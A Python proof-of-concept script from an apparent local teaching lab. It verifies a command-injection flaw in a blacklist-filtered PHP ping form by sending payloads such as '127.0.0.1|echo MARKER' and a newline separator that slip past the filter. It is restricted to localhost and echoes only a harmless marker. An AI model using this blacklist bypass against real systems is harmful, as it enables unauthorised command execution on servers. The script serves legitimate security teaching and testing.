#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CMD-003 -- command-injection verification draft (teaching lab, local only).

Endpoint taken from the audited normalized sample CMD-003.php:

    if ( isset( $_POST['Submit'] ) ) {
        $target = trim($_REQUEST['ip']);
        $target = str_replace( <blacklist>, '', $target );
        if ( stristr( php_uname('s'), 'Windows NT' ) ) {
            $cmd = shell_exec( 'ping  ' . $target );
        } else {
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }
        $html .= "<pre>{$cmd}</pre>";
    }

The blacklist removes the literal substrings  ||   &   ;   '| '   -   $   (   )   `
so this draft never sends any of those substrings.  It chains a second command
with a pipe that is NOT followed by a space ('|echo'), which no blacklist entry
covers, and -- on *nix only -- with a newline separator, which is not in the
blacklist at all.

Everything executed on the target is `echo` of ONE fixed marker string.
No reverse shell, no file read, no download, no persistence, no change to data.

Usage:
    python CMD-003_poc.py --base-url http://127.0.0.1 --cookie-file .\\cookie.txt

The cookie file contains a single header value such as
    PHPSESSID=abc123; security=low
It is read from disk and never printed.

Only localhost / 127.0.0.1 / ::1 are accepted; redirects are refused.

Exit codes: 0 = all planned requests completed (judge the printed summary),
            2 = request/connection/auth problem,
            3 = refused argument (scheme, host, cookie format).
"""

import argparse
import sys
from urllib import error, parse, request

MARKER = "DSH_MARKER_CMD003"
ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}

# label -> value sent as the 'ip' parameter
PAYLOADS = [
    ("baseline_plain_ip", "127.0.0.1"),
    ("pipe_no_space", "127.0.0.1|echo " + MARKER),
    ("newline_separator_nix", "127.0.0.1\n echo " + MARKER),
    ("control_space_after_pipe", "127.0.0.1 | echo " + MARKER),
]


class RefuseRedirect(request.HTTPRedirectHandler):
    """Turn every 3xx into an error instead of following it."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise error.HTTPError(
            req.full_url, code, "redirect refused: %s" % newurl, headers, fp
        )


def build_parser():
    p = argparse.ArgumentParser(
        description="CMD-003 local teaching-lab verification draft "
                    "(harmless echo marker only)."
    )
    p.add_argument("--base-url", required=True,
                   help="e.g. http://127.0.0.1 or http://127.0.0.1:8080")
    p.add_argument("--path", default="/vulnerabilities/exec/",
                   help="form/endpoint path that includes the audited snippet")
    p.add_argument("--cookie-file", default=None,
                   help="local file holding one Cookie header value "
                        "(PHPSESSID=<value>; security=<level>)")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--only", default=None,
                   help="run one payload by label (default: all)")
    return p


def refuse(msg, code=3):
    sys.stderr.write("REFUSED: %s\n" % msg)
    raise SystemExit(code)


def check_url(raw):
    parts = parse.urlsplit(raw)
    if parts.scheme not in ("http", "https"):
        refuse("scheme %r is not http/https" % parts.scheme)
    host = (parts.hostname or "").strip("[]")
    if host not in ALLOWED_HOSTS:
        refuse("host %r is not localhost/127.0.0.1/::1" % host)
    return raw.rstrip("/")


def load_cookie(path):
    if not path:
        return None
    try:
        with open(path, "r", encoding="utf-8") as fh:
            raw = fh.read().strip()
    except OSError as exc:
        refuse("cannot read cookie file: %s" % exc, 2)
    if not raw:
        refuse("cookie file is empty", 2)
    if "=" not in raw:
        refuse("cookie file must contain NAME=VALUE pairs", 2)
    return " ".join(raw.splitlines())


def post(opener, url, value, cookie, timeout):
    body = parse.urlencode([("Submit", "Submit"), ("ip", value)])
    req = request.Request(url, data=body.encode("ascii"), method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "cmd003-verify-draft/1.0")
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except error.HTTPError as exc:
        if "redirect refused" in str(exc.msg):
            return exc.code, "REDIRECT_REFUSED"
        try:
            body_text = exc.read().decode("utf-8", "replace")
        except Exception:
            body_text = ""
        return exc.code, body_text
    except error.URLError as exc:
        return None, "CONNECTION_ERROR: %s" % exc.reason
    except OSError as exc:
        return None, "SOCKET_ERROR: %s" % exc


def pre_blocks(html):
    blocks = []
    pos = 0
    while True:
        start = html.find("<pre>", pos)
        if start < 0:
            return blocks
        end = html.find("</pre>", start)
        if end < 0:
            blocks.append(html[start + 5:])
            return blocks
        blocks.append(html[start + 5:end])
        pos = end + 6


def summarise(html):
    blocks = pre_blocks(html)
    joined = "\n".join(blocks)
    return {
        "marker_in_body": MARKER in html,
        "marker_in_pre": MARKER in joined,
        "pre_count": len(blocks),
        "pre_excerpt": joined.strip()[:600],
        "login_form": ("name=\"username\"" in html.lower()
                       or "login.php" in html.lower()),
    }


def main(argv):
    args = build_parser().parse_args(argv)
    base = check_url(args.base_url)
    url = base + args.path
    cookie = load_cookie(args.cookie_file)

    opener = request.build_opener(RefuseRedirect())
    results = []
    problems = []

    for label, value in PAYLOADS:
        if args.only and label != args.only:
            continue
        status, body = post(opener, url, value, cookie, args.timeout)
        if status is None:
            problems.append("%s: %s" % (label, body))
            results.append({
                "label": label,
                "payload": value.replace("\n", "\\n"),
                "http_status": None,
                "error": body,
            })
            continue
        info = summarise(body)
        info.update({
            "label": label,
            "payload": value.replace("\n", "\\n"),
            "http_status": status,
        })
        results.append(info)

    print("URL: %s" % url)
    print("Cookie supplied: %s" % ("yes" if cookie else "no"))
    for item in results:
        print("---")
        print("label          : %s" % item.get("label"))
        print("payload        : %r" % item.get("payload"))
        print("http_status    : %s" % item.get("http_status"))
        if item.get("error"):
            print("error          : %s" % item.get("error"))
            continue
        print("marker_in_body : %s" % item.get("marker_in_body"))
        print("marker_in_pre  : %s" % item.get("marker_in_pre"))
        print("login_form     : %s" % item.get("login_form"))
        print("pre_excerpt    : %s" % item.get("pre_excerpt").replace("\n", " | "))

    base_item = next((r for r in results if r.get("label") == "baseline_plain_ip"), None)
    test_items = [r for r in results
                  if r.get("label") in ("pipe_no_space", "newline_separator_nix")]
    control = next((r for r in results
                    if r.get("label") == "control_space_after_pipe"), None)

    if problems:
        print("RESULT: request problem(s); no conclusion about the vulnerability.")
        return 2
    if base_item and base_item.get("login_form") and not base_item.get("marker_in_pre"):
        print("RESULT: the response looks like a login page; supply a valid "
              "session cookie file and retry.")
        return 2
    observed = [r.get("label") for r in test_items if r.get("marker_in_pre")]
    if observed:
        print("RESULT: MARKER observed for %s -- extra command output appeared "
              "next to ping output." % ", ".join(observed))
        if control is not None:
            print("CONTROL (space after pipe) marker_in_pre: %s"
                  % control.get("marker_in_pre"))
        return 0
    print("RESULT: no marker observed in the <pre> block. This is NOT proof of "
          "safety: check OS branch, ping availability, disable_functions, WAF "
          "and whether the deployed file is this blacklist version.")
    return 2


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
